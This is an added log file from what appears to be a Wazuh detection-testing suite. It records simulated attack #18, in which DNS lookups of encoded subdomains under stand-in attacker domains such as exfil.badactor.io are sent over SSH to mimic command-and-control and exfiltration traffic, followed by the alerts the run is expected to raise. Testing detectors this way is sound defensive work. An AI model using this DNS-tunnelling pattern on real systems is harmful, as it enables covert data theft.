@@ -1,0 +1,58 @@
+./18_suspicious_dns.sh
+===============================================================================
+ATTACK #18: Suspicious DNS Queries
+===============================================================================
+Mode: ssh
+Logging: off (iptables LOG on agent OUTPUT udp/53)
+Category: Command & Control
+
+[*] Attack started at: 2026-01-06T18:56:02+03:00
+[*] Issuing suspicious DNS lookups...
+
+[*] Running attack via SSH to ubuntu@ec2-54-204-182-4.compute-1.amazonaws.com
+[*] Resolving xYlvyA==.malicious-domain.example
+Server:         127.0.0.53
+Address:        127.0.0.53#53
+
+** server can't find xYlvyA==.malicious-domain.example: NXDOMAIN
+
+Host xYlvyA==.malicious-domain.example not found: 3(NXDOMAIN)
+[*] Resolving LmAF4g==.c2.example.net
+Server:         127.0.0.53
+Address:        127.0.0.53#53
+
+Non-authoritative answer:
+*** Can't find LmAF4g==.c2.example.net: No answer
+
+[*] Resolving 7Blq6Q==.dropzone.attacker.com
+;; Got SERVFAIL reply from 127.0.0.53
+Server:         127.0.0.53
+Address:        127.0.0.53#53
+
+** server can't find 7Blq6Q==.dropzone.attacker.com: SERVFAIL
+
+Host 7Blq6Q==.dropzone.attacker.com not found: 2(SERVFAIL)
+[*] Resolving c37hQQ==.exfil.badactor.io
+Server:         127.0.0.53
+Address:        127.0.0.53#53
+
+** server can't find c37hQQ==.exfil.badactor.io: NXDOMAIN
+
+Host c37hQQ==.exfil.badactor.io not found: 3(NXDOMAIN)
+
+===============================================================================
+[✓] Attack completed
+===============================================================================
+End Time: 2026-01-06T18:56:12+03:00
+Duration: 10 seconds
+
+Expected Wazuh alerts:
+  - Suspicious DNS queries / potential C2 traffic (enable DNS/iptables logging)
+  - iptables LOG lines with prefix 'wazuh-dns ' (if LOGGING=on)
+
+Data for CSV:
+  attack_id: 18
+  attack_name: Suspicious DNS Queries
+  category: Command & Control
+  attack_start_time: 2026-01-06T18:56:02+03:00
+  attack_end_time: 2026-01-06T18:56:12+03:00
